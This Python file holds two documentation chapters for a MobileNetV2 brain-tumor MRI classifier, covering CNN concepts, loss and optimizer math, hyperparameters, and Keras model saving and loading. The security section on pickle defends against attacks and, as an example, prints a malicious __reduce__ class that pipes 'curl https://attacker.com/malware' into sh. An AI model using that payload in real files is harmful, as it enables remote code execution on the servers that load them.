"""
Chapters 8 and 9 for the End-to-End Documentation Guide.
"""

CHAPTER_8 = """# Chapter 8: Machine Learning Model Explained

## 8.1 Convolutional Neural Networks (CNN) Explained Simply

### The Five-Year-Old Child Analogy
Imagine you are looking through a small cardboard toilet paper tube at a massive puzzle on the floor. 
- When you look through the tube at one tiny corner, you can only see a small straight line or a patch of color. 
- As you slide the tube across the puzzle, your brain remembers: *"Here is a line, here is another line, and over here they connect to form a circle!"* 
- When you step back and look at all those shapes together, your brain says: *"That circle with two triangles on top is a cat's head!"*

### The Technical Reality
A Convolutional Neural Network (CNN) does the exact same thing mathematically using **Kernels (Filters)**:
1. **Convolution Operation:** A small mathematical matrix (e.g., $3 \times 3$ pixels) slides across the $224 \times 224$ image, computing dot products between its weights and local pixel patches.
2. **Receptive Field:** Early layers have small receptive fields, detecting edges, gradients, and textures. Deeper layers combine those low-level features to recognize complex anatomical structures (e.g., ventricular symmetry, dural borders, abnormal focal hyperintensities).
3. **Spatial Hierarchy:** Pooling and stride operations progressively reduce spatial dimensions while expanding channel depth, converting raw spatial pixels into rich semantic feature vectors.

---

## 8.2 The MobileNetV2 Architecture

### Why MobileNetV2 Instead of ResNet50 or VGG16?
In medical software development, compute efficiency is critical. Consider the architectural comparison:

| Metric | VGG16 | ResNet50 | MobileNetV2 (Our Backbone) |
| :--- | :--- | :--- | :--- |
| **Total Parameters** | ~138 Million | ~25.6 Million | **~3.4 Million (Outer Head Total: 2.42M)** |
| **Model Disk Size** | ~528 MB | ~98 MB | **~11.1 MB** |
| **Multiply-Accumulate (MAC) Operations** | ~15.3 Billion | ~3.8 Billion | **~300 Million (12x faster!)** |
| **Inference Latency (CPU)** | ~450 ms | ~120 ms | **~25 ms** |

MobileNetV2 delivers state-of-the-art feature extraction while remaining small enough to run in real time on standard hospital CPU workstations without requiring expensive, power-hungry GPUs.

### The Secret Sauce: Depthwise Separable Convolutions
Standard convolutions perform spatial filtering and channel combining simultaneously, which is computationally expensive. MobileNetV2 splits standard convolution into two decoupled steps:

```
[ Standard Convolution ]
  Input: (H x W x C_in) ──[ 3x3 x C_in x C_out Filter ]──> Output: (H x W x C_out)
  Computational Cost: H x W x C_in x C_out x 3 x 3

[ Depthwise Separable Convolution ]
  Step 1: Depthwise Convolution
  Applies ONE 3x3 filter per input channel independently (Spatial filtering only)
  Cost: H x W x C_in x 3 x 3
               │
               ▼
  Step 2: Pointwise Convolution
  Applies 1x1 convolutions across all channels to combine features (Channel mixing)
  Cost: H x W x C_in x C_out x 1 x 1

  Total Computation Reduction:
  Ratio = (Depthwise + Pointwise) / Standard ≈ 1/N + 1/K^2 ≈ 1/9 (8 to 9 Times Faster!)
```

### Inverted Residuals & Linear Bottlenecks
Traditional residual blocks (like ResNet) compress channels first, apply convolution, and then expand. MobileNetV2 inverts this:
1. **Expansion:** Expands channel depth by a factor of 6 using $1 \times 1$ conv.
2. **Depthwise Filtering:** Filters spatially in high-dimensional space where features are easily separable.
3. **Linear Bottleneck:** Projects back to a low-dimensional representation **without** a non-linear ReLU activation. (Why? Non-linearities in low dimensions destroy information manifolds; keeping the bottleneck linear preserves subtle signals).

---

## 8.3 Transfer Learning Philosophy & Frozen Base

We initialize MobileNetV2 with weights pre-trained on **ImageNet** (1.4 million real-world images across 1,000 categories).

### The "Frozen Base" Rule
In our architecture, we explicitly set:
```python
base_model.trainable = False
```
- **Why?** Our custom classification head begins with completely random weights. If we backpropagated gradients through MobileNetV2 during the first epochs, huge gradient swings would destroy the pre-trained feature extractors—a phenomenon known as **Catastrophic Forgetting**.
- By freezing the base, MobileNetV2 acts as a rock-solid, static feature extractor, allowing our dense classification head to stabilize smoothly.

---

## 8.4 Mathematical Formulations

### 1. Categorical Cross-Entropy Loss
Because our problem involves four mutually exclusive classes, we optimize using Categorical Cross-Entropy:

$$\mathcal{L} = -\sum_{c=1}^{4} y_c \log(\hat{y}_c)$$

Where:
- $y_c \in \{0, 1\}$ is the ground-truth one-hot label.
- $\hat{y}_c \in [0.0, 1.0]$ is the predicted probability for class $c$.
- If the true class is Glioma ($y_1 = 1$) and the model predicts $\hat{y}_1 = 0.95$, loss is $-\log(0.95) \approx 0.051$ (low penalty). If it predicts $\hat{y}_1 = 0.10$, loss explodes to $-\log(0.10) \approx 2.302$ (severe penalty).

### 2. The Softmax Activation
To convert the four raw numerical outputs (logits $z_1, z_2, z_3, z_4$) from the final Dense layer into valid probabilities that sum to $1.0$:

$$\hat{y}_c = \frac{e^{z_c}}{\sum_{j=1}^{4} e^{z_j}}$$

- The exponential function $e^z$ ensures all outputs are strictly positive.
- The denominator normalizes the sum to exactly $1.0$.

### 3. The Adam Optimizer
We compile the model with the **Adam (Adaptive Moment Estimation)** optimizer:
- Adam maintains exponential moving averages of both past gradients ($m_t$, the first moment / momentum) and past squared gradients ($v_t$, the second moment / uncentered variance).
- It adapts the learning rate independently for each parameter: parameters with frequent, large gradients get smaller updates, while parameters with sparse gradients get larger updates.
- Learning rate used: $\eta = 0.001$ (`1e-3`).

---

## 8.5 Comprehensive Hyperparameters Table

| Hyperparameter | Project Value | Data Type | Default in Keras | Practical Effect of Altering |
| :--- | :--- | :--- | :--- | :--- |
| `IMG_HEIGHT`, `IMG_WIDTH` | $224 \times 224$ | Integer | None | Higher (e.g. 512) captures micro-features but increases RAM & compute by 4x. Lower (e.g. 112) loses tumor margin sharpness. |
| `BATCH_SIZE` | $32$ | Integer | 32 | Larger (64) trains faster but requires more GPU/CPU RAM. Smaller (16) introduces noisy gradient updates that can act as regularization. |
| `learning_rate` (Adam) | $0.001$ (`1e-3`) | Float | 0.001 | If too large ($0.01$), loss diverges and weights oscillate wildly. If too small ($1\text{e-}5$), the head requires 50+ epochs to converge. |
| `Dense` units (Head) | $128$ | Integer | None | More units (512) increase capacity but risk overfitting on 5,600 images. Fewer (32) create a bottleneck that underfits complex tumor features. |
| `Dropout` rate 1 | $0.3$ ($30\%$) | Float | 0.0 | Fraction of neurons randomly zeroed after GAP. Higher (0.5) increases regularization; lower (0.1) risks memorizing training scans. |
| `Dropout` rate 2 | $0.2$ ($20\%$) | Float | 0.0 | Secondary regularization after the 128-unit dense projection. |
| `rotation_range` (Aug) | $0.05$ (~$18^\circ$) | Float | 0.0 | Maximum random rotation. Must be small in cranial MRI because brains are naturally aligned; extreme $90^\circ$ tilts violate anatomical plausibility. |
| `zoom_range` (Aug) | $0.05$ ($5\%$) | Float | 0.0 | Simulates subtle scanner distance variations without cropping out peripheral meningiomas. |
| `EPOCHS` (Full Model) | $8$ | Integer | 1 | Calibrated based on empirical convergence of the 80/20 run (which reached minimum loss at Epoch 7). |
| `overlay_alpha` | $0.45$ | Float | None | Grad-CAM blending weight. $0.0$ shows raw MRI only; $1.0$ shows pure Jet colormap. $0.45$ yields optimal diagnostic transparency. |
"""

CHAPTER_9 = """# Chapter 9: Model Saving and Loading

## 9.1 The Serialization Format: Native Keras v3 (`.keras`)

Our production model is stored on disk at:  
[`d:\Brain_Tumor\models\brain_tumor_mobilenetv2_full_scratch.keras`](file:///d:/Brain_Tumor/models/brain_tumor_mobilenetv2_full_scratch.keras) (File size: 11.1 MB).

### What Is a `.keras` File Under the Hood?
Historically, Keras saved models as monolithic HDF5 files (`.h5`). In modern Keras (v3 / TensorFlow 2.15+), the native `.keras` format is actually a **standard ZIP archive** containing structured components:
```text
brain_tumor_mobilenetv2_full_scratch.keras (ZIP Archive)
├── config.json               # Complete neural network topology & layer connection graph
├── model.weights.h5          # Layer weights and bias tensors stored in high-speed HDF5 format
└── metadata.json             # Framework version, Keras version, and date metadata
```

---

## 9.2 Exact Saving Code Dissected

In `notebooks/02_model_training.ipynb`:
```python
FULL_MODEL_PATH = BASE_DIR / "models" / "brain_tumor_mobilenetv2_full_scratch.keras"

callbacks_full = [
    ModelCheckpoint(
        filepath=str(FULL_MODEL_PATH),
        monitor="loss",
        mode="min",
        save_best_only=True,
        verbose=1
    ),
    ReduceLROnPlateau(
        monitor="loss",
        mode="min",
        factor=0.2,
        patience=2,
        min_lr=1e-6,
        verbose=1
    )
]

history_full = full_model.fit(
    full_train_ds,
    epochs=8,
    callbacks=callbacks_full,
    verbose=1
)
```

### Line-by-Line Mechanics:
- `ModelCheckpoint`: An automated callback hook listening at the end of each epoch.
- `monitor="loss", mode="min"`: Compares the training loss of the current epoch against the historical minimum.
- `save_best_only=True`: If Epoch 7 achieves `loss = 0.1639` and Epoch 8 has `loss = 0.1672`, Keras ignores Epoch 8 and preserves the Epoch 7 checkpoint on disk!
- `filepath=str(FULL_MODEL_PATH)`: Writes the complete architecture and weights atomically to disk.

---

## 9.3 Exact Loading Code Dissected

In `app.py`:
```python
@st.cache_resource(show_spinner=False)
def load_neuroscan_model():
    # Loads and caches the best trained model in memory.
    preferred_path = BASE_DIR / "models" / "brain_tumor_mobilenetv2_full_scratch.keras"
    fallback_path = BASE_DIR / "models" / "brain_tumor_mobilenetv2_best.keras"
    
    model_path = preferred_path if preferred_path.exists() else fallback_path
    if not model_path.exists():
        st.error(f"Model file not found at: {model_path}")
        return None, None
    
    model = tf.keras.models.load_model(model_path)
    base_model = [l for l in model.layers if "mobilenet" in l.name.lower()][0]
    return model, base_model
```

### Why Loading Differs Radically from Training:
1. **No Gradient Tape Overhead:** During training, TensorFlow must allocate memory buffers for backward gradients. During loading, the computational graph is loaded in pure forward-inference mode.
2. **Deterministic Evaluation:** All Dropout layers are placed into inactive mode, and Batch Normalization layers use their frozen population running statistics ($\mu, \sigma^2$) rather than computing batch metrics.

---

## 9.4 Serialization Format Comparison & Security Vulnerabilities

| Format | Extension | Primary Framework | Security Risk | Human-Readable Structure? | Project Decision |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Keras v3 Native** | `.keras` | Keras 3 / TensorFlow 2.16+ | **Low** (Safe JSON config + HDF5 weights) | Partial (ZIP archive with JSON) | **Adopted (Primary Production Artifact)** |
| **Legacy HDF5** | `.h5` | Keras 2 / Legacy TF | Low / Medium | No (Binary HDF5 container) | Supported as historical fallback |
| **Python Pickle** | `.pkl` | Standard Python | **EXTREME CRITICAL RISK** | No (Binary bytecode stream) | **STRICTLY REJECTED** |
| **Joblib** | `.joblib` | Scikit-Learn | **EXTREME CRITICAL RISK** | No (Compressed Pickle) | Not used (designed for Scikit-learn, not Keras) |

### The Critical Pickle Security Exploit (Interview Essential)
Never use `pickle` for deep learning model serialization in production!
- Python's `pickle` serialization format allows classes to define a special `__reduce__()` method.
- When `pickle.load()` deserializes a file, it executes whatever callable is returned by `__reduce__()`.
- An attacker can craft a malicious `.pkl` file that executes arbitrary operating system commands:
  ```python
  import os
  class MaliciousPayload:
      def __reduce__(self):
          return (os.system, ("curl https://attacker.com/malware | sh",))
  ```
- The moment a hospital server loads `model.pkl`, the server is compromised!
- **Our project uses `.keras`**, which deserializes model topology purely from declarative JSON dictionaries and loads numerical arrays directly into tensor buffers, completely mitigating arbitrary code execution.
"""

print("Writing Chapters 8 and 9 module...")
